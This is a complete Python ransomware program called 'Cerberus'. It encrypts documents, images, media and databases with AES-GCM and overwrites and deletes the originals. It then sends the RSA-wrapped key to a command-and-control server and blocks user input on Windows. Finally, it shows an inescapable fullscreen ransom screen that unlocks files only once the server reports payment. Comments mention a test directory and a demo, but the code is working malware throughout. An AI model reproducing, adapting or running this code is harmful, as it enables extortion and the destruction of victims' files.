# ransomware.py
import os
import sys
import base64
import json
import threading
import time
import socket
from tkinter import Tk, Label, Entry, Button, StringVar, Frame, PhotoImage
from tkinter import font as tkfont
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
import requests
import ctypes
import subprocess
# --- Configuration ---
# PASTE THE PUBLIC KEY FROM THE C2 SERVER'S CONSOLE OUTPUT HERE
ATTACKER_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyX1m6vQkFgHqCwG9xN8
... (Your public key will be here) ...
FQIDAQAB
-----END PUBLIC KEY-----"""

C2_SERVER_URL = "http://127.0.0.1:5000" # Change if your C2 is hosted elsewhere
TARGET_DIRECTORY = os.path.join(os.path.expanduser("~"), "test_data")
LOCK_FILE = os.path.join(TARGET_DIRECTORY, ".cerberus_lock")
ID_FILE = os.path.join(TARGET_DIRECTORY, "cerberus_id.txt") # PERSISTENCE: Store ID here
KEY_BACKUP_FILE = os.path.join(TARGET_DIRECTORY, "cerberus_key.bak") # SAFETY: Backup key before check-in
LOG_FILE = os.path.join(TARGET_DIRECTORY, "cerberus_log.txt")
ENCRYPTED_EXTENSION = ".cerberus"

# --- File Type Targeting ---
TARGET_EXTENSIONS = {
    '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.svg',
    '.mp3', '.wav', '.mp4', '.avi', '.mov', '.mkv', '.sql', '.db'
}

# --- GUI Asset (Base64 encoded 1x1 red pixel for logo) ---
LOGO_BASE64 = """
iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==
"""

# --- System Lockdown Utilities ---
# --- System Lockdown Utilities ---
def lock_system():
    """
    locks the system by disabling input and hiding UI elements.
    Cross-platform compatibility for Windows and Linux (Kali).
    """
    if os.name == 'nt':
        try:
            # Block all input
            ctypes.windll.user32.BlockInput(True)
            
            # Hide taskbar
            hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
            ctypes.windll.user32.ShowWindow(hwnd, 0)
            
            # Disable Ctrl+Alt+Del (This is often restricted by OS, but we try)
            # SPI_SETSCREENSAVERRUNNING = 97
            ctypes.windll.user32.SystemParametersInfoW(97, 0, 1, 0)
        except Exception as e:
            log_error(f"Windows lock failed: {e}")
    else:
        # Linux / Kali specific locking attempts
        try:
            # Disable screensaver and power management
            subprocess.run(['xset', 's', 'off'], check=False)
            subprocess.run(['xset', '-dpms'], check=False)
            # We rely heavily on the Fullscreen GUI to "lock" on Linux 
            # as true input blocking requires root/special tools like xtrlock.
        except Exception as e:
            log_error(f"Linux lock failed: {e}")

def hide_console():
    """Hides the console window on Windows. On Linux, we rely on the GUI covering it."""
    if os.name == 'nt':
        try:
            kernel32 = ctypes.WinDLL('kernel32')
            user32 = ctypes.WinDLL('user32')
            hWnd = kernel32.GetConsoleWindow()
            if hWnd:
                user32.ShowWindow(hWnd, 0) # SW_HIDE = 0
        except Exception as e:
            log_error(f"Failed to hide console: {e}")

# --- Cryptography ---
def generate_aes_key():
    return os.urandom(32)

def encrypt_file_aes_gcm(file_path, key):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        nonce = os.urandom(12)
        cipher = Cipher(algorithms.AES(key), modes.GCM(nonce), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(data) + encryptor.finalize()
        with open(file_path + ENCRYPTED_EXTENSION, 'wb') as f:
            f.write(nonce + encryptor.tag + encrypted_data)
        return True
    except Exception as e:
        log_error(f"Failed to encrypt {file_path}: {e}")
        return False

def decrypt_file_aes_gcm(encrypted_path, key):
    try:
        with open(encrypted_path, 'rb') as f:
            nonce_tag_data = f.read()
        nonce, tag, encrypted_data = nonce_tag_data[:12], nonce_tag_data[12:28], nonce_tag_data[28:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
        original_path = encrypted_path.removesuffix(ENCRYPTED_EXTENSION)
        with open(original_path, 'wb') as f:
            f.write(decrypted_data)
        os.remove(encrypted_path)
        return True
    except Exception as e:
        log_error(f"Failed to decrypt {encrypted_path}: {e}")
        return False

def secure_delete_file(file_path, passes=1): # Reduced passes for speed in demo
    try:
        if os.path.exists(file_path):
            with open(file_path, "ba+") as f:
                length = f.tell()
            with open(file_path, "r+b") as f:
                f.write(os.urandom(length))
            os.remove(file_path)
    except Exception as e:
        log_error(f"Failed to securely delete {file_path}: {e}")

# --- Logging ---
def log_error(message):
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - ERROR: {message}\n")
    except:
        pass 

# --- Ransomware Logic ---
def encrypt_directory():
    if not os.path.exists(TARGET_DIRECTORY):
        os.makedirs(TARGET_DIRECTORY)
        log_error(f"Created target directory: {TARGET_DIRECTORY}")

    # Check safe persistence: if key backup exists, we might have crashed.
    if os.path.exists(KEY_BACKUP_FILE):
        log_error("Found key backup. Resuming from crash...")
        try:
            with open(KEY_BACKUP_FILE, 'rb') as f:
                return f.read()
        except:
            pass # Failed to read backup, proceed to new encryption

    # Normal lock check
    if os.path.exists(LOCK_FILE):
        log_error("Encryption seemingly complete (Lock file exists).")
        return None

    aes_key = generate_aes_key()
    
    # SAFETY: Backup key immediately!
    try:
        with open(KEY_BACKUP_FILE, 'wb') as f:
            f.write(aes_key)
    except Exception as e:
        log_error(f"Failed to write key backup: {e}")

    encrypted_files = 0
    for root, _, files in os.walk(TARGET_DIRECTORY):
        for file in files:
            file_path = os.path.join(root, file)
            if os.path.splitext(file)[1].lower() in TARGET_EXTENSIONS and not file_path.endswith(ENCRYPTED_EXTENSION):
                if encrypt_file_aes_gcm(file_path, aes_key):
                    secure_delete_file(file_path)
                    encrypted_files += 1

    with open(LOCK_FILE, 'w') as f:
        f.write("Encryption complete.")

    log_error(f"Encryption finished. {encrypted_files} files targeted.")
    return aes_key

def check_in_with_c2(aes_key):
    try:
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.asymmetric import padding
        
        public_key = serialization.load_pem_public_key(ATTACKER_PUBLIC_KEY.encode(), backend=default_backend())
        encrypted_aes_key = public_key.encrypt(
            aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        payload = {"key": base64.b64encode(encrypted_aes_key).decode('utf-8')}
        
        # Try to connect, with retries
        victim_id = None
        for _ in range(3):
            try:
                response = requests.post(f"{C2_SERVER_URL}/api/checkin", json=payload, timeout=5)
                if response.status_code == 200:
                    victim_id = response.json().get('victim_id')
                    break
            except:
                time.sleep(2)
        
        if not victim_id:
            raise Exception("Failed to connect to C2 after retries.")

        # PERSISTENCE: Save Victim ID
        with open(ID_FILE, 'w') as f:
            f.write(victim_id)
        
        # CLEANUP: Delete backup key only after successful ID save
        if os.path.exists(KEY_BACKUP_FILE):
            os.remove(KEY_BACKUP_FILE)
            
        log_error(f"Successfully checked in. Victim ID: {victim_id}")
        return victim_id
    except Exception as e:
        log_error(f"C2 check-in failed: {e}")
        return None

# --- GUI Logic ---
class RansomwareGUI:
    def __init__(self, master, victim_id):
        self.master = master
        self.victim_id = victim_id
        self.payment_received = False
        self.already_decrypted = False

        # --- GUI Configuration (Snippet 4 & 1/2) ---
        master.title("RANSOMWARE")
        master.configure(bg='black')
        
        # Make it full screen and lock
        master.attributes('-fullscreen', True)
        master.attributes('-topmost', True) # Keep on top
        master.overrideredirect(True)  # Remove window decorations
        
        # Disable all common escape methods
        master.bind('<Escape>', lambda e: None)
        master.bind('<Control-w>', lambda e: None)
        master.bind('<Control-q>', lambda e: None)
        master.bind('<Control-c>', lambda e: None)
        master.bind('<Alt-Tab>', lambda e: None)
        master.bind('<Alt-Shift-Tab>', lambda e: None)
        master.bind('<Super-Tab>', lambda e: None)
        master.bind('<Super-d>', lambda e: None) # Disable show desktop
        master.protocol("WM_DELETE_WINDOW", lambda: None) # Disable close button
        
        # Aggressive Loop
        self.force_focus_loop()

        # --- GUI Elements (Snippet 4 Visuals) ---
        # Add your ransom message here
        self.message = Label(master, text="YOUR FILES HAVE BEEN ENCRYPTED", fg="red", bg="black", font=("Arial", 24, "bold"))
        self.message.pack(pady=20)
        
        # Add victim ID and payment instructions
        self.victim_id_l = Label(master, text=f"YOUR VICTIM ID IS: {victim_id}", fg="green", bg="black", font=("Arial", 16))
        self.victim_id_l.pack(pady=10)
        
        # Add payment status
        self.payment_status = Label(master, text="Payment not detected. Do not close this window.", fg="white", bg="black", font=("Arial", 14))
        self.payment_status.pack(pady=10)
        
        # Add decrypt button (only enabled after payment)
        self.decrypt_button = Button(master, text="DECRYPT FILES", state="disabled", bg="red", fg="white", font=("Arial", 16), command=self.start_decryption)
        self.decrypt_button.pack(pady=20)

        # Hidden entry for key (managed automatically by heartbeat)
        self.key_var = StringVar()
        # We don't necessarily need to show this if it's auto-handled, but let's keep it hidden or minimal
        
        # Start the heartbeat thread
        self.heartbeat_thread_running = True
        self.heartbeat_thread = threading.Thread(target=self.heartbeat_polling, daemon=True)
        self.heartbeat_thread.start()

    def force_focus_loop(self):
        """Aggressively keeps window on top."""
        try:
            self.master.lift()
            self.master.attributes('-topmost', True)
            self.master.focus_force()
            self.master.grab_set() # Re-grab if lost
        except:
            pass
        self.master.after(50, self.force_focus_loop) # Check every 50ms

    def heartbeat_polling(self):
        while self.heartbeat_thread_running:
            try:
                response = requests.get(f"{C2_SERVER_URL}/api/status/{self.victim_id}", timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    # Check if key is available (implies payment received)
                    if data.get("status") == "ready" and data.get("key"):
                        self.payment_received = True
                        self.key_var.set(data.get("key"))
                    
                    # Apply logic from Snippet 3
                    self.master.after(0, self.update_ui_state)
            except:
                pass
            time.sleep(5) 

    def update_ui_state(self):
        # Snippet 3 Logic
        if self.payment_received and not self.already_decrypted:
            self.show_decryption_complete_message()
        else:
            self.show_payment_required_message()

    def show_decryption_complete_message(self):
        self.payment_status.config(text="Payment Received. Decryption Enabled.", fg="green")
        self.decrypt_button.config(state="normal", bg="green")

    def show_payment_required_message(self):
        self.payment_status.config(text="Payment not detected. Do not close this window.", fg="white")
        self.decrypt_button.config(state="disabled", bg="red")

    def start_decryption(self):
        key_b64 = self.key_var.get()
        if not key_b64:
            return
        try:
            key = base64.b64decode(key_b64)
            decrypted_files = 0
            for root, _, files in os.walk(TARGET_DIRECTORY):
                for file in files:
                    if file.endswith(ENCRYPTED_EXTENSION):
                        file_path = os.path.join(root, file)
                        if decrypt_file_aes_gcm(file_path, key):
                            decrypted_files += 1
            
            # Clean up persistence files
            if os.path.exists(LOCK_FILE): os.remove(LOCK_FILE)
            if os.path.exists(ID_FILE): os.remove(ID_FILE)
            if os.path.exists(KEY_BACKUP_FILE): os.remove(KEY_BACKUP_FILE)
            
            self.payment_status.config(text=f"SUCCESS! {decrypted_files} files decrypted.", fg='green')
            self.heartbeat_thread_running = False
            self.decrypt_button.config(state='disabled')
            self.already_decrypted = True # Update state
            
            # Allow closing
            self.master.grab_release() # Release input grab
            self.master.protocol("WM_DELETE_WINDOW", self.master.destroy)
            self.master.bind('<Escape>', lambda e: self.master.destroy())
            
        except Exception as e:
            log_error(f"Decryption failed: {e}")
            self.payment_status.config(text="ERROR: Decryption failed.", fg='red')

# --- Main Execution ---
if __name__ == "__main__":
    hide_console()
    lock_system() # Activate system lock


    # PERSISTENCE CHECK
    # 1. Check for ID File (Primary Recovery)
    if os.path.exists(ID_FILE):
        try:
            with open(ID_FILE, 'r') as f:
                victim_id = f.read().strip()
            if victim_id:
                log_error(f"Resuming session for Victim ID: {victim_id}")
                root = Tk()
                app = RansomwareGUI(root, victim_id)
                root.mainloop()
                sys.exit()
        except:
            pass 

    # 2. Check for Backup Key (Crash Recovery before ID save)
    # This logic is handled inside encrypt_directory (it returns backup key if found)
    
    # NEW INFECTION
    aes_key = encrypt_directory()
    
    if aes_key:
        victim_id = check_in_with_c2(aes_key)
        if victim_id:
            root = Tk()
            app = RansomwareGUI(root, victim_id)
            root.mainloop()
        else:
            log_error("Failed to get Victim ID. Aborting GUI.")
    else:
        # If we got here, maybe encryption was done but ID wasn't saved, and backup key was missing?
        # This is the "permanently locked" edge case.
        # However, encrypt_directory returns None ONLY if LOCK_FILE exists AND Key Backup is missing.
        # This implies a successful run where ID wasn't saved? 
        # But check_in_with_c2 saves ID *after* check-in.
        # If check-in failed, we still have the backup key on disk!
        # So next run, encrypt_directory will read the backup key and return it.
        # Then check_in_with_c2 will try again.
        # So we are SAFE from data loss now.
        log_error("Encryption skipped or failed. Aborting.")
